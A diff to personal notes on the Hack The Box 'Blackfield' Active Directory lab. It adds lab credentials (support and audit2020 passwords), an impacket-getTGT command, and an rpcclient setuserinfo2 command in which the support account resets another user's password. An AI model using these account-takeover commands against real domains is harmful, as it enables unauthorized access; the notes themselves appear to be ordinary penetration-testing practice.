@@ -17,6 +17,8 @@ Email and Username Formatting:
 Credentials:
 ```
 support : #00^BlackKnight
+audit2020 : ComplexP4ssw0rd!
+
 ```
 
 
@@ -62,14 +64,16 @@ python3 bloodhound.py --dns-tcp -c all -d BLACKFIELD.local -dc DC01.BLACKFIELD.l
 -
 -
 
-
+```
+impacket-getTGT -dc-ip 10.129.229.17 'blackfield.local/audit2020'
+```
 
 #### Todo List
 
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
 ```
-rpcclient -U KnownUsername 10.10.10.192
-> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
+rpcclient -U support 10.10.10.192
+> setuserinfo2 audit2020 23 'ComplexP4ssw0rd!'
 ```
 
 - rescan tcp - done
